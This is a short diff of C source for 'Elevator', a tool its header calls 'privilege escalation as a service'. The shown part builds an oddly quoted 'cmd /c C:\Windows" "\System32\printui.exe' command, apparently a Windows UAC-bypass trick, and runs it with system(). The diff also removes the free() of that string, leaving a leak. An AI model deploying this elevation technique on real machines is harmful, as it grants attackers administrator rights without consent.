@@ -1,5 +1,5 @@
 /*
- * Elevator - Privilege elevation as a service ;)
+ * Elevator - Privilege escalation as a service
  *
  * This is free and unencumbered software released into the public domain.
  *
@@ -94,7 +94,7 @@ int elevator(const char* command) {
     // Allocate and build the full command line string
     const char* commandPrefix = "cmd /c C:\\Windows\" \"\\System32\\printui.exe ";
     const char* commandSuffix = command;
-    command = strcat((char*) realloc(_strdup(commandPrefix),strlen(commandPrefix) + strlen(commandSuffix) + 1), commandSuffix);
+    command = strcat((char*) realloc(_strdup(commandPrefix), strlen(commandPrefix) + strlen(commandSuffix) + 1), commandSuffix);
 
     // Set up the elevation environment
     if (setUpEnvironment()) {
@@ -103,9 +103,6 @@ int elevator(const char* command) {
 
     // Aaaaaaand run it...
     system(command);
-
-    // Deallocate the full command string
-    free((void*) command);
 
     // Tear down the elevation environment
     if (tearDownEnvironment()) {
